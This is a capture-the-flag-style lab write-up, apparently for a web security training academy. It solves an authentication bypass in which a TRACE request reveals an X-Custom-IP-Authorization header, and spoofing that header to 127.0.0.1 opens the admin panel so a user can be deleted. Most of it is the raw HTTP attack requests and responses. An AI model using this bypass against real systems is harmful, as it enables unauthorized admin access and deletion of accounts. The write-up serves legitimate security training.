## Authentication bypass via information disclosure

This lab's administration interface has an authentication bypass vulnerability, but it is impractical to exploit without knowledge of a custom HTTP header used by the front-end.

To solve the lab, obtain the header name then use it to bypass the lab's authentication. Access the admin interface and delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter

## Notes

- /admin
- /login
- **TRACE** method

## Resume

1. Try to access the `/admin`
2. **TRACE** request on `/admin`
3. **GET** request on `/admin` with the custom header on `127.0.0.1`
4. **Request in browser** to access the `/admin`
5. Delete Carlos account

## Solve 

Try to access the `/admin` : 

`HTTP/2 401 Unauthorized : Admin interface only available to local users`

Do a **TRACE** request on `/admin`, the response will exposes all received headers : 

```
HTTP/2 200 OK
Content-Type: message/http
X-Frame-Options: SAMEORIGIN
Content-Length: 775

TRACE /admin HTTP/1.1
Host: 0af00024036551e381490309005f006b.web-security-academy.net
sec-ch-ua: "Not-A.Brand";v="24", "Chromium";v="146"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
accept-language: fr-FR,fr;q=0.9
upgrade-insecure-requests: 1
user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
sec-fetch-site: none
sec-fetch-mode: navigate
sec-fetch-user: ?1
sec-fetch-dest: document
accept-encoding: gzip, deflate, br
priority: u=0, i
cookie: session=C7WrF0SoCYY9QxGM3CbMCa0kQIqwINfV
Content-Length: 0
X-Custom-IP-Authorization: 192.168.1.1
```

Send a **GET** request to `/admin` with the custom header `X-Custom-IP-Authorization: localhost`. The first **401** said : `Admin interface only available to local users` in this case we try with localhost or alternative in order to access the `/admin`. With `X-Custom-Ip-Authorization: 127.0.0.1` we have a **200** on the `/admin`. 

```
GET /admin HTTP/2
Host: 0af00024036551e381490309005f006b.web-security-academy.net
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: fr-FR,fr;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Cookie: session=C7WrF0SoCYY9QxGM3CbMCa0kQIqwINfV
Content-Length: 2
X-Custom-Ip-Authorization: 127.0.0.1
```

The answer : 

```
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
X-Frame-Options: SAMEORIGIN
Content-Length: 3231

                   <section>
                        <h1>Users</h1>
                        <div>
                            <span>wiener - </span>
                            <a href="/admin/delete?username=wiener">Delete</a>
                        </div>
                        <div>
                            <span>carlos - </span>
                            <a href="/admin/delete?username=carlos">Delete</a>
                        </div>
                    </section>
```

Update the **GET** request on `/admin` and delete Carlos account : 

```
GET /admin/delete?username=carlos HTTP/2
Host: 0af00024036551e381490309005f006b.web-security-academy.net
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: fr-FR,fr;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Cookie: session=C7WrF0SoCYY9QxGM3CbMCa0kQIqwINfV
Content-Length: 2
X-Custom-Ip-Authorization: 127.0.0.1
```